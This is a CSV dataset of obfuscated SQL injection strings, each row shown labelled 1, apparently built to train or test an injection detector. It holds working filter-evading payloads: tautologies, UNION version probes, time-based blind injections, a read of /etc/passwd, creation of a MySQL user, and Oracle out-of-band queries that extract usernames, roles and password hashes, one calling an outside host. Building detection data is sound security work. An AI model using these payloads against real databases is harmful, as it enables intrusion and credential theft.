Query,Label
"o/**/r 1  =  1 o/**/r """"  =  ",1
/**/o/**/r/**/1/**/  =  /**/1,1
" sel/**/ect * f/**/rom users w/**/here id  =  1 o/**/r "".  (  "" o/**/r 1  =  1 -- 1",1
" s/**/elect * fro/**/m users w/**/here id  =  '1' un/**/ion sel/**/ect ||/1,version  (    )   -- 1'",1
" se/**/lect * fro/**/m users wher/**/e id  =  '1' unio/**/n s/**/elect +\.,@@VERSION -- 1'",1
o/**/r 1  =  1/*,1
%27 o/**/r 1  =  1,1
" selec/**/t * f/**/rom users whe/**/re id  =  1 <@&@ un/**/ion s/**/elect 1,version  (    )   -- 1",1
" sele/**/ct * fr/**/om users whe/**/re id  =  '1' unio/**/n sele/**/ct $*$,@@VERSION -- 1'",1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1
" s/**/elect * fro/**/m users w/**/here id  =  '1' o/**/r $ 1  =  1 un/**/ion s/**/elect 1,@@VERSION -- 1'",1
se/**/lect * f/**/rom users wher/**/e id  =  1 o/**/r \.<1 o/**/r 1  =  1 -- 1,1
" selec/**/t * fr/**/om users wher/**/e id  =  '1' o/**/r \<\ u/**/nion s/**/elect 1,@@VERSION -- 1'",1
" sel/**/ect * f/**/rom users whe/**/re id  =  1 unio/**/n sele/**/ct 1||1,version  (    )   -- 1",1
" s/**/elect * f/**/rom users wher/**/e id  =  1 ||1 uni/**/on se/**/lect n/**/ull,banner fro/**/m v$version whe/**/re rownum  =  1 -- 1",1
se/**/lect * fr/**/om users wh/**/ere id  =  '1' o/**/r \.<\ o/**/r 1  =  1 -- 1',1
" se/**/lect * fro/**/m users whe/**/re id  =  1 o/**/r ""]{"" o/**/r 1  =  1 -- 1",1
" s/**/elect * f/**/rom users whe/**/re id  =  1 o/**/r "".@"" o/**/r 1  =  1 -- 1",1
" sel/**/ect * fro/**/m users wh/**/ere id  =  1 o/**/r ""$["" o/**/r 1  =  1 -- 1",1
o/**/r 1 --',1
" sel/**/ect * fr/**/om users wher/**/e id  =  1 o/**/r "",;"" o/**/r 1  =  1 -- 1",1
"admi/**/n"" o/**/r 1  =  1#",1
" s/**/elect * fro/**/m users wh/**/ere id  =  1 +  (  1  )   u/**/nion se/**/lect nu/**/ll,banner fr/**/om v$version whe/**/re rownum  =  1 -- 1",1
\x27UN/**/ION SEL/**/ECT,1
PRI/**/NT,1
" selec/**/t * fro/**/m users wher/**/e id  =  '1' uni/**/on sel/**/ect   (  \.  )  ,@@VERSION -- 1'",1
o/**/r 1  =  1--,1
1 o/**/r pg_sleep  (  __TIME__  )  --,1
" se/**/lect * fro/**/m users wh/**/ere id  =  1 o/**/r "",#"" o/**/r 1  =  1 -- 1",1
admi/**/n'  )   o/**/r   (  '1'  =  '1'/*,1
o/**/r 2 b/**/etween 1 an/**/d 3,1
" selec/**/t * fro/**/m users whe/**/re id  =  1 o/**/r ""  )  .""  =  1 o/**/r 1  =  1 -- 1",1
" s/**/elect * fr/**/om users whe/**/re id  =  1 o/**/r 1#"". u/**/nion se/**/lect n/**/ull,version  (    )   -- 1",1
admi/**/n' o/**/r '1'  =  '1,1
; if no/**/t  (  s/**/elect system_user  )   <> 'sa' waitfo/**/r delay '0:0:2' --,1
" se/**/lect * fr/**/om users wher/**/e id  =  1 un/**/ion sele/**/ct 1,banner f/**/rom v$version wher/**/e rownum  =  1 -- 1",1
""" o/**/r 0  =  0 --",1
" sele/**/ct * fro/**/m users whe/**/re id  =  1 u/**/nion sel/**/ect @ $_,version  (    )   -- 1",1
sele/**/ct * f/**/rom users wh/**/ere id  =  1 <@.$ o/**/r 1  =  1 -- 1,1
" sele/**/ct * f/**/rom users wher/**/e id  =  1 o/**/r ""%."" o/**/r 1  =  1 -- 1",1
" s/**/elect * fro/**/m users wher/**/e id  =  1 + $+*$ un/**/ion sele/**/ct nul/**/l,@@VERSION -- 1",1
" s/**/elect * fro/**/m users whe/**/re id  =  1 o/**/r "",."" o/**/r 1  =  1 -- 1",1
char%4039%41%2b%40SELEC/**/T,1
" sel/**/ect * f/**/rom users wher/**/e id  =  1 o/**/r ""1&"" o/**/r 1  =  1 -- 1",1
admi/**/n'  )   o/**/r   (  '1'  =  '1,1
declare @s varchar   (  200  )   sel/**/ect @s   =   0x73656c6 ...,1
"o/**/r 0  =  0 #""",1
" sele/**/ct * f/**/rom users wher/**/e id  =  1 o/**/r "".]"" o/**/r 1  =  1 -- 1",1
  )   o/**/r   (  'x'  =  'x,1
" s/**/elect * f/**/rom users whe/**/re id  =  1.<@$ uni/**/on se/**/lect 1,version  (    )   -- 1",1
$  (  sleep 50  ) ,1
" selec/**/t * f/**/rom users w/**/here id  =  1 *1 unio/**/n s/**/elect nu/**/ll,banner fro/**/m v$version wher/**/e rownum  =  1 -- 1",1
"1 un/**/ion all sele/**/ct 1,2,3,4,5,6,name f/**/rom sysobjects wh/**/ere xtype   =   'u' --",1
" s/**/elect * fr/**/om users w/**/here id  =  1 o/**/r 1#"". unio/**/n se/**/lect 'a',version  (    )   -- 1",1
" sel/**/ect * fr/**/om users whe/**/re id  =  1 o/**/r 1#""; unio/**/n selec/**/t nu/**/ll,version  (    )   -- 1",1
" sel/**/ect * f/**/rom users wh/**/ere id  =  1 o/**/r 1#""? o/**/r 1  =  1 -- 1",1
"""a"""" o/**/r 1  =  1--""",1
" sel/**/ect * fr/**/om users whe/**/re id  =  1 *1 u/**/nion s/**/elect 1,banner f/**/rom v$version whe/**/re rownum  =  1 -- 1",1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT DI/**/STI/**/NCT  (  column_name  )   FR/**/OM   (  S/**/ELECT DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LIM/**/IT F/**/ROM all_tab_columns  )   WH/**/ERE L/**/IMIT  =  4   )    )    AN/**/D 'i'  =  'i",1
" se/**/lect * fr/**/om users wh/**/ere id  =  '1' un/**/ion sel/**/ect   (  \  )  ,@@VERSION -- 1'",1
1 a/**/nd user_name  (    )     =   'dbo',1
"; if no/**/t  (  substri/**/ng   (    (   sele/**/ct @@version  )  ,24,1  )   <> 1  )   waitfo/**/r delay '0:0:2' --",1
" se/**/lect * f/**/rom users whe/**/re id  =  1 o/**/r 1#""$ unio/**/n selec/**/t 1,version  (    )   -- 1",1
" sel/**/ect * fro/**/m users w/**/here id  =  1 o/**/r 1#""{ u/**/nion selec/**/t nu/**/ll,version  (    )   -- 1",1
sele/**/ct * fro/**/m users wh/**/ere id  =  '1' *$ . o/**/r 1  =  1 -- 1',1
se/**/lect * f/**/rom users wher/**/e id  =  1 +$+. o/**/r 1  =  1 -- 1,1
sel/**/ect * f/**/rom users whe/**/re id  =  1 o/**/r   (  \+  )    =  1 o/**/r 1  =  1 -- 1,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  USERNAME  )   F/**/ROM   (  SE/**/LECT DI/**/STI/**/NCT  (  USERNAME  )  , ROWNUM AS LIM/**/IT F/**/ROM SYS.ALL_USERS  )   WHE/**/RE LI/**/MIT  =  6   )    )    AN/**/D 'i'  =  'i",1
o/**/r 1  =  1 o/**/r ''  =  ',1
sel/**/ect * fr/**/om users w/**/here id  =  1   o/**/r 1  =  1 -- 1,1
o/**/r 'text' > 't',1
"1234 "" A/**/ND 1  =  0 UNIO/**/N ALL S/**/ELECT ""admi/**/n"", ""81dc9bdb52d04dc20036dbd8313ed055",1
" se/**/lect * f/**/rom users w/**/here id  =  1 o/**/r ""%["" o/**/r 1  =  1 -- 1",1
" s/**/elect * fr/**/om users wh/**/ere id  =  1 o/**/r 1#"";  =  1 u/**/nion se/**/lect 1,version  (    )   -- 1",1
admi/**/n' o/**/r '1'  =  '1'#,1
sele/**/ct * fro/**/m users wh/**/ere id  =  1 +$ 1 o/**/r 1  =  1 -- 1,1
s,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  USERNAME  )   FR/**/OM   (  SEL/**/ECT DI/**/STI/**/NCT  (  USERNAME  )  , ROWNUM AS L/**/IMIT FRO/**/M SYS.ALL_USERS  )   WH/**/ERE LIM/**/IT  =  4   )    )    AN/**/D 'i'  =  'i",1
 sel/**/ect * fro/**/m i/**/nfo/**/rmation_schema.t/**/ables--,1
" s/**/elect * f/**/rom users wher/**/e id  =  1 o/**/r ""$&"" o/**/r 1  =  1 -- 1",1
1   )    )    o/**/r pg_sleep  (  __TIME__  )  --,1
" se/**/lect * fro/**/m users wher/**/e id  =  '1' unio/**/n sele/**/ct !<@,version  (    )   -- 1'",1
declare @q nvarchar   (  200  )   sel/**/ect @q   =   0x770061 ...,1
 o/**/r 1  =  1 o/**/r ''  =  ',1
selec/**/t * fro/**/m users w/**/here id  =  1 %!<1 o/**/r 1  =  1 -- 1,1
declare @q nvarchar   (  200  )   s/**/elect @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1
" sele/**/ct * f/**/rom users wher/**/e id  =  1 o/**/r ""]1"" o/**/r 1  =  1 -- 1",1
" selec/**/t * fro/**/m users wh/**/ere id  =  1 o/**/r $+<1 u/**/nion selec/**/t 1,@@VERSION -- 1",1
o/**/r 'unusual'   =   'unusual',1
 o/**/r 1 i/**/n   (  sel/**/ect @@version  )  --,1
t/**/runcate,1
as,1
 o/**/r 3  =  3 --,1
" selec/**/t * fr/**/om users whe/**/re id  =  1 ||1 uni/**/on se/**/lect 1,banner f/**/rom v$version wher/**/e rownum  =  1 -- 1",1
" selec/**/t * fro/**/m users wher/**/e id  =  1 <@$$ unio/**/n selec/**/t 1,version  (    )   -- 1",1
"admi/**/n""  )   o/**/r   (  ""1""  =  ""1",1
" selec/**/t * f/**/rom users w/**/here id  =  1 o/**/r 1#""@ u/**/nion selec/**/t 'a',version  (    )   -- 1",1
"1  )   o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
" se/**/lect * fr/**/om users wher/**/e id  =  1 un/**/ion selec/**/t .1_,version  (    )   -- 1",1
 AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT SYS.DATAB/**/ASE_NAME F/**/ROM DUAL   )    )    A/**/ND 'i'  =  'i,1
" o/**/r 0  =  0 #""",1
selec/**/t * fr/**/om users wh/**/ere id  =  1 %$ 1 o/**/r 1  =  1 -- 1,1
s/**/elect * fro/**/m users w/**/here id  =  1 %!<@ o/**/r 1  =  1 -- 1,1
"; if n/**/ot  (  substri/**/ng   (    (   s/**/elect @@version  )  ,25,1  )   <> 0  )   waitfo/**/r delay '0:0:2' --",1
1  )   o/**/r sleep  (  __TIME__  )  #,1
" sel/**/ect * fr/**/om users wh/**/ere id  =  1 o/**/r ""1_"" o/**/r 1  =  1 -- 1",1
" sel/**/ect * fr/**/om users wh/**/ere id  =  1 <1## unio/**/n se/**/lect 1,version  (    )   -- 1",1
" s/**/elect * fro/**/m users w/**/here id  =  1 + $+*\ uni/**/on s/**/elect nul/**/l,@@VERSION -- 1",1
s/**/elect * fr/**/om users whe/**/re id  =  1. <@ o/**/r 1  =  1 -- 1,1
 o/**/r true--,1
; execute immediate 'sel' || 'ect us' || 'er',1
hi' o/**/r 'x'  =  'x';,1
sel/**/ect * fr/**/om users whe/**/re id  =  1 <@ o/**/r 1  =  1 -- 1,1
" se/**/lect * f/**/rom users wher/**/e id  =  1 o/**/r "".,"" o/**/r 1  =  1 -- 1",1
admi/**/n' #,1
" se/**/lect * f/**/rom users wh/**/ere id  =  1 <@$_ uni/**/on s/**/elect 1,version  (    )   -- 1",1
" selec/**/t * f/**/rom users wh/**/ere id  =  1 o/**/r "",  (  "" o/**/r 1  =  1 -- 1",1
" selec/**/t * fro/**/m users wher/**/e id  =  1 o/**/r "",{"" o/**/r 1  =  1 -- 1",1
" un/**/ion selec/**/t 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1
"""  )  ;waitfo/**/r delay '0:0:__TIME__'--",1
 o/**/r 'unusual'   =   'unusual',1
"i/**/n/**/sert i/**/nt/**/o mysql.user   (  user, host, passwo/**/rd  )   v/**/alues   (  'name', 'localhost', passwo/**/rd  (  'pass123'   )    )   ",1
"admi/**/n"" o/**/r ""1""  =  ""1""/*",1
" s/**/elect * f/**/rom users w/**/here id  =  1 o/**/r ""1  (  ""  =  1 o/**/r 1  =  1 -- 1",1
" se/**/lect * f/**/rom users wh/**/ere id  =  1 o/**/r \<1 u/**/nion selec/**/t 1,@@VERSION -- 1",1
lik/**/e,1
o/**/r username lik/**/e char  (  37  )  ;,1
 )    )    o/**/r pg_sleep  (  __TIME__  )  --,1
selec/**/t * fro/**/m users whe/**/re id  =  1 o/**/r $+<\ o/**/r 1  =  1 -- 1,1
o/**/r 3  =  3,1
" selec/**/t * f/**/rom users w/**/here id  =  1 o/**/r ""  (  ."" o/**/r 1  =  1 -- 1",1
se/**/lect * fro/**/m users whe/**/re id  =  1 o/**/r   (  $+  )    =  1 o/**/r 1  =  1 -- 1,1
exec sp,1
" selec/**/t * f/**/rom users whe/**/re id  =  1 o/**/r \+<$ unio/**/n selec/**/t 1,@@VERSION -- 1",1
s/**/elect * fr/**/om users wher/**/e id  =  1 o/**/r \<$ o/**/r 1  =  1 -- 1,1
" selec/**/t * f/**/rom users w/**/here id  =  1.&&1 un/**/ion selec/**/t 1,version  (    )   -- 1",1
admi/**/n' o/**/r 1  =  1/*,1
a' waitfo/**/r delay '0:0:10'--,1
" sel/**/ect * fr/**/om users w/**/here id  =  1 +  (  \  )   unio/**/n selec/**/t n/**/ull,@@VERSION -- 1",1
" selec/**/t * f/**/rom users w/**/here id  =  1 un/**/ion se/**/lect .1$_,version  (    )   -- 1",1
a/**/nd 1 i/**/n   (  sel/**/ect var fro/**/m temp  )  --,1
hi'  )   o/**/r   (  'a'  =  'a,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT DI/**/STI/**/NCT  (  column_name  )   FRO/**/M   (  SEL/**/ECT DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LIM/**/IT F/**/ROM all_tab_columns  )   WHE/**/RE LI/**/MIT  =  1   )    )    AN/**/D 'i'  =  'i",1
"admi/**/n"" o/**/r 1  =  1",1
"""  )   o/**/r true--",1
" se/**/lect * fro/**/m users wh/**/ere id  =  '1' o/**/r $ .  =  1 uni/**/on s/**/elect 1,@@VERSION -- 1'",1
" sele/**/ct * f/**/rom users wh/**/ere id  =  1 o/**/r ""  (  {"" o/**/r 1  =  1 -- 1",1
1  )   o/**/r pg_sleep  (  __TIME__  )  --,1
" s/**/elect * f/**/rom users wher/**/e id  =  1 o/**/r ""{."" o/**/r 1  =  1 -- 1",1
"""  )   o/**/r sleep  (  __TIME__  )    =  """,1
s/**/elect * fro/**/m users wher/**/e id  =  1.<@. o/**/r 1  =  1 -- 1,1
"admi/**/n""  )   o/**/r   (  ""1""  =  ""1""--",1
" sele/**/ct * fro/**/m users wh/**/ere id  =  1<@.. uni/**/on sele/**/ct 1,version  (    )   -- 1",1
; exec xp_regread,1
" selec/**/t * f/**/rom users wh/**/ere id  =  '1' + @ 1 u/**/nion sele/**/ct 1,version  (    )   -- 1'",1
sele/**/ct * f/**/rom users wh/**/ere id  =  1 + \+%1 o/**/r 1  =  1 -- 1,1
" se/**/lect * f/**/rom users wh/**/ere id  =  1 o/**/r "";1"" o/**/r 1  =  1 -- 1",1
" se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r ""%&"" o/**/r 1  =  1 -- 1",1
1 a/**/nd 1  =  1,1
o/**/r 0  =  0 #,1
uni/**/on selec/**/t * fr/**/om users wher/**/e logi/**/n   =   char ...,1
" se/**/lect * fr/**/om users whe/**/re id  =  1 uni/**/on sele/**/ct 1||@,version  (    )   -- 1",1
admi/**/n'  )   o/**/r '1'  =  '1'--,1
1;SELEC/**/T *,1
" sel/**/ect * f/**/rom users whe/**/re id  =  1 o/**/r ""{;"" o/**/r 1  =  1 -- 1",1
x' a/**/nd 1  =    (  se/**/lect count  (  *  )   fr/**/om tabname  )  ; --,1
" selec/**/t * fro/**/m users w/**/here id  =  '1' o/**/r """"<@ uni/**/on sel/**/ect 1,version  (    )   -- 1'",1
" sel/**/ect * fr/**/om users wher/**/e id  =  1 o/**/r ""?,"" o/**/r 1  =  1 -- 1",1
" se/**/lect * fro/**/m users wh/**/ere id  =  '1' ||1 u/**/nion s/**/elect 1,banner fr/**/om v$version wh/**/ere rownum  =  1 -- 1'",1
"1 o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
procedure,1
o/**/r ''  =  ',1
 AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT SYS.LOGI/**/N_USER FR/**/OM DUAL   )    )    AN/**/D 'i'  =  'i,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T DI/**/STI/**/NCT  (  USERNAME  )   F/**/ROM   (  SELE/**/CT DI/**/STI/**/NCT  (  USERNAME  )  , ROWNUM AS LIM/**/IT FRO/**/M SYS.ALL_USERS  )   WHE/**/RE LIM/**/IT  =  2   )    )    A/**/ND 'i'  =  'i",1
\'; d/**/esc users; --,1
" sele/**/ct * f/**/rom users whe/**/re id  =  1 o/**/r   (  \.  )    =  1 uni/**/on se/**/lect 1,@@VERSION -- 1",1
sele/**/ct * fro/**/m users w/**/here id  =  '1' o/**/r $ 1  =  1 o/**/r 1  =  1 -- 1',1
""" o/**/r """"^""",1
"""-""",1
" sel/**/ect * fr/**/om users w/**/here id  =  1 o/**/r \<   =  1 uni/**/on se/**/lect 1,@@VERSION -- 1",1
" s/**/elect * fro/**/m users whe/**/re id  =  1 un/**/ion sele/**/ct 1<@$,version  (    )   -- 1",1
" sele/**/ct * fro/**/m users wher/**/e id  =  1 *\ un/**/ion s/**/elect n/**/ull,@@VERSION -- 1",1
" se/**/lect * fr/**/om users wher/**/e id  =  '1' o/**/r !<@ u/**/nion sel/**/ect 1,version  (    )   -- 1'",1
" sele/**/ct * f/**/rom users wher/**/e id  =  1 o/**/r "".%"" o/**/r 1  =  1 -- 1",1
admi/**/n'/*,1
" sele/**/ct * fro/**/m users whe/**/re id  =  1 o/**/r ""  (  #"" o/**/r 1  =  1 -- 1",1
||UTL_HTTP.REQUEST,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  tabl/**/e_name  )   FRO/**/M   (  SE/**/LECT DI/**/STI/**/NCT  (  t/**/able_name  )  , ROWNUM AS LIM/**/IT F/**/ROM sys.all_t/**/ables  )   W/**/HERE LIM/**/IT  =  1   )    )    A/**/ND 'i'  =  'i",1
" sel/**/ect * fro/**/m users whe/**/re id  =  '1'<@.. un/**/ion se/**/lect 1,version  (    )   -- 1'",1
"""   )    )    o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
" selec/**/t * fr/**/om users w/**/here id  =  1 <@.$ unio/**/n se/**/lect 1,version  (    )   -- 1",1
" se/**/lect * fro/**/m users wher/**/e id  =  1 o/**/r $ .  =  1 uni/**/on sel/**/ect 1,@@VERSION -- 1",1
se/**/lect * fro/**/m users wh/**/ere id  =  '1' <@.$ o/**/r 1  =  1 -- 1',1
1 uni/**/on selec/**/t all f/**/rom whe/**/re,1
" sel/**/ect * fro/**/m users wher/**/e id  =  1 +$ . uni/**/on sel/**/ect nu/**/ll,@@VERSION -- 1",1
" sel/**/ect * f/**/rom users whe/**/re id  =  1 o/**/r 1#""? uni/**/on sele/**/ct n/**/ull,version  (    )   -- 1",1
admi/**/n'  )   o/**/r '1'  =  '1'#,1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
o/**/r '7659'  =  '7659,1
" se/**/lect * f/**/rom users wher/**/e id  =  1 o/**/r ""{@"" o/**/r 1  =  1 -- 1",1
" sel/**/ect * fr/**/om users wh/**/ere id  =  1 u/**/nion selec/**/t +!<1,version  (    )   -- 1",1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT DI/**/STI/**/NCT  (  granted_role  )   FRO/**/M   (  SEL/**/ECT DI/**/STI/**/NCT  (  granted_role  )  , ROWNUM AS LI/**/MIT FRO/**/M dba_role_privs W/**/HERE GRANTEE  =  SYS.LOGI/**/NUSER  )   WH/**/ERE LIM/**/IT  =  6   )    )    AN/**/D 'i'  =  'i",1
" se/**/lect * f/**/rom users whe/**/re id  =  1 o/**/r ""  (  @"" o/**/r 1  =  1 -- 1",1
o/**/r true--,1
" selec/**/t * fr/**/om users w/**/here id  =  1 un/**/ion se/**/lect !<1,version  (    )   -- 1",1
" sel/**/ect * fr/**/om users whe/**/re id  =  '1' u/**/nion se/**/lect \#,@@VERSION -- 1'",1
" se/**/lect * f/**/rom users wher/**/e id  =  1 o/**/r 1#""{ unio/**/n s/**/elect 1,version  (    )   -- 1",1
""" o/**/r true--",1
s/**/elect * fro/**/m users w/**/here id  =  1. o/**/r 1  =  1 -- 1,1
" sele/**/ct * f/**/rom users wher/**/e id  =  1 o/**/r @#"",  =  1 un/**/ion sele/**/ct 1,version  (    )   -- 1",1
" s/**/elect * fr/**/om users w/**/here id  =  1 o/**/r "";@"" o/**/r 1  =  1 -- 1",1
â o/**/r 3  =  3 --,1
 AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT global_name FRO/**/M global_name   )    )    A/**/ND 'i'  =  'i,1
" sele/**/ct * f/**/rom users wh/**/ere id  =  1 +1 un/**/ion se/**/lect nu/**/ll,banner f/**/rom v$version w/**/here rownum  =  1 -- 1",1
" s/**/elect * f/**/rom users wher/**/e id  =  1 o/**/r "",,""  =  1 o/**/r 1  =  1 -- 1",1
" sele/**/ct * fro/**/m users wher/**/e id  =  1 + $+%1 u/**/nion s/**/elect nu/**/ll,@@VERSION -- 1",1
" se/**/lect * f/**/rom users w/**/here id  =  1 o/**/r 1#""? u/**/nion sele/**/ct version  (    )  ,version  (    )   -- 1",1
" sel/**/ect * fro/**/m users whe/**/re id  =  1 o/**/r ""  )  1"" o/**/r 1  =  1 -- 1",1
 o/**/r uid l/**/ike '%,1
selec/**/t * f/**/rom users wh/**/ere id  =  '1' <@&1 o/**/r 1  =  1 -- 1',1
" s/**/elect * f/**/rom users w/**/here id  =  '1' uni/**/on se/**/lect !<1,version  (    )   -- 1'",1
23 o/**/r 1  =  1; --,1
" se/**/lect * fro/**/m users w/**/here id  =  1 o/**/r \<\. uni/**/on sele/**/ct 1,@@VERSION -- 1",1
" sel/**/ect * fr/**/om users wh/**/ere id  =  1 o/**/r ""{  (  ""  =  1 o/**/r 1  =  1 -- 1",1
" s/**/elect * fro/**/m users wh/**/ere id  =  1 o/**/r ""%_"" o/**/r 1  =  1 -- 1",1
se/**/lect * fr/**/om users wher/**/e id  =  1 +   (  \.  )   o/**/r 1  =  1 -- 1,1
" se/**/lect * fr/**/om users w/**/here id  =  '1' un/**/ion sele/**/ct \,@@VERSION -- 1'",1
0 o/**/r 1  =  1,1
sel/**/ect * fr/**/om users whe/**/re id  =  1 &@ o/**/r 1  =  1 -- 1,1
"admi/**/n""  )   o/**/r ""1""  =  ""1",1
sel/**/ect * fro/**/m users whe/**/re id  =  1 o/**/r \<   =  1 o/**/r 1  =  1 -- 1,1
" se/**/lect * f/**/rom users wher/**/e id  =  1 o/**/r ""??"" o/**/r 1  =  1 -- 1",1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   F/**/ROM   (  SELEC/**/T DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS L/**/IMIT F/**/ROM SYS.USER$  )   WHER/**/E LIMI/**/T  =  5   )    )    A/**/ND 'i'  =  'i",1
